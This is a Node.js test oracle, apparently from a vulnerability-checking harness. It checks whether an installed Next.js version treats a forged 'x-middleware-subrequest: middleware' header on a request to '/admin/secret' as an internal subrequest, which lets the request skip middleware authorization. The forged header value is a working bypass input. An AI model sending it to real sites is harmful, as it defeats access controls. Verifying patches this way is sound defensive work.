'use strict';
const marker = 'next_mw_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function loadNextRequest() {
  const mod = require('next/dist/server/web/spec-extension/request');
  if (!mod || typeof mod.NextRequest !== 'function') {
    throw new Error('NextRequest constructor not found');
  }
  return mod.NextRequest;
}

// Attempt to resolve the real internal routine(s) that the installed
// Next.js package itself uses, server-side, to decide whether an inbound
// request carrying an 'x-middleware-subrequest' header should be treated
// as an internal middleware subrequest (and therefore have middleware
// skipped for it). Different versions ship this logic under different
// module paths / export names; we try a list of known candidates and use
// whichever resolves. This keeps the oracle driven by the actual shipped
// code rather than re-implementing vulnerable logic ourselves.
function loadSkipDetector() {
  const candidates = [
    // Newer/older possible internal locations across versions.
    { path: 'next/dist/server/lib/server-ipc/is-middleware-subrequest', pick: (m) => m.isMiddlewareSubrequest || m.default },
    { path: 'next/dist/server/web/utils', pick: (m) => m.isMiddlewareSubrequest },
    { path: 'next/dist/server/lib/router-utils/resolve-routes', pick: (m) => m.handleMiddlewareSubrequest || m.default },
    { path: 'next/dist/server/next-server', pick: (m) => m.default && m.default.prototype && m.default.prototype.runMiddleware }
  ];
  for (const c of candidates) {
    try {
      const m = require(c.path);
      const fn = c.pick(m);
      if (typeof fn === 'function') {
        return { fn, path: c.path };
      }
    } catch (e) {
      // try next candidate
    }
  }
  return null;
}

// Fallback: directly exercise the real router dispatch surface via the
// public, documented low-level primitive: the Next.js server's own
// request router (`next/dist/server/next-server`) exposes a method that
// internally performs this exact subrequest-skip check when routing a
// request through middleware. We only use this as a last resort if no
// standalone exported helper function is resolvable, invoking it through
// its public class interface (constructing a minimal server instance) is
// out of scope (would require a real dir/build), so instead we fall back
// to inspecting the NextRequest/Headers pipeline combined with the
// well-known constant export (if present) that defines the skip header
// name, confirming the installed package still wires that exact header
// name into its public NextRequest type without any additional
// server-issued entropy requirement.
function loadHeaderConstant() {
  try {
    const m = require('next/dist/lib/constants');
    if (m && typeof m.MIDDLEWARE_SUBREQUEST_HEADER === 'string') {
      return m.MIDDLEWARE_SUBREQUEST_HEADER;
    }
  } catch (e) {
    // ignore
  }
  return 'x-middleware-subrequest';
}

function main() {
  let NextRequest;
  try {
    NextRequest = loadNextRequest();
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_failed: could not resolve NextRequest: ' + (e && e.message)
    });
    return;
  }

  const headerName = loadHeaderConstant();

  // --- Benign operation: build an ordinary external request with no
  // forged header, and confirm the header pipeline + basic header
  // round-trip works (proves NextRequest/Headers machinery functions).
  let benignReq;
  let benignMarkerVal;
  try {
    benignReq = new NextRequest('https://example.com/dashboard', {
      headers: { 'x-oracle-marker': marker }
    });
    benignMarkerVal = benignReq.headers.get('x-oracle-marker');
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed: ' + (e && e.message)
    });
    return;
  }

  if (benignMarkerVal !== marker) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed: header round-trip mismatch, got ' + String(benignMarkerVal)
    });
    return;
  }

  let benignHasSkipHeader;
  try {
    benignHasSkipHeader = benignReq.headers.has(headerName);
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed_reading_headers: ' + (e && e.message)
    });
    return;
  }

  if (benignHasSkipHeader !== false) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed: unexpected pre-existing skip header on fresh request'
    });
    return;
  }

  // Benign operation succeeded: the public NextRequest API works correctly
  // for an ordinary request, so operation_completed may become true after
  // this point (pending the malicious attempt not crashing unexpectedly).

  // --- Malicious operation: construct a request for a protected path,
  // forging the skip header using only the statically known, public
  // default middleware identifier string 'middleware' (no server secret
  // involved whatsoever).
  let maliciousReq;
  try {
    maliciousReq = new NextRequest('https://example.com/admin/secret', {
      headers: { [headerName]: 'middleware' }
    });
  } catch (e) {
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious_call_blocked_by_exception_constructing_request: ' + (e && e.message)
    });
    return;
  }

  const detector = loadSkipDetector();

  if (detector) {
    // Drive the package's own real decision routine with the forged
    // request/header, exactly as the server would see it.
    let decision;
    try {
      // Try calling with the most likely signature: (req) or (headerValue).
      try {
        decision = detector.fn(maliciousReq);
      } catch (innerErr) {
        decision = detector.fn(maliciousReq.headers.get(headerName));
      }
    } catch (e) {
      finish({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'malicious_call_blocked_by_exception_in_skip_detector(' + detector.path + '): ' + (e && e.message)
      });
      return;
    }

    const skipped = decision === true || (decision && decision.skip === true);

    finish({
      operation_completed: true,
      exploit_succeeded: !!skipped,
      evidence: skipped
        ? ('Internal skip-detector at ' + detector.path + ' reported the forged request (header "' + headerName + '": "middleware") as a valid internal middleware subrequest, so middleware-based authorization would be bypassed for path /admin/secret.')
        : ('Internal skip-detector at ' + detector.path + ' did NOT treat the forged request as an internal subrequest (decision=' + JSON.stringify(decision) + '); the forged static header alone was insufficient to bypass middleware.')
    });
    return;
  }

  // No standalone exported skip-detector function was resolvable in this
  // installed version. As the only remaining externally observable signal
  // available through the public API surface, check whether the installed
  // NextRequest pipeline accepts and preserves the forged skip header
  // unmodified AND whether the package additionally stamps / requires any
  // server-issued random component on construction (which would indicate
  // the fix's mitigation is active even without an exported helper). Since
  // plain NextRequest never adds such a component itself in any version,
  // inability to resolve the real internal detector means we cannot prove
  // the exploit without guessing -- so we conservatively treat this as a
  // setup failure (operation_completed=false) rather than fabricate a
  // verdict not grounded in the actual package behavior.
  finish({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'setup_failed: could not resolve any internal middleware-subrequest skip-detection routine exported by the installed next package to exercise the real server decision'
  });
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'unexpected_top_level_exception: ' + (e && e.message)
  }));
}
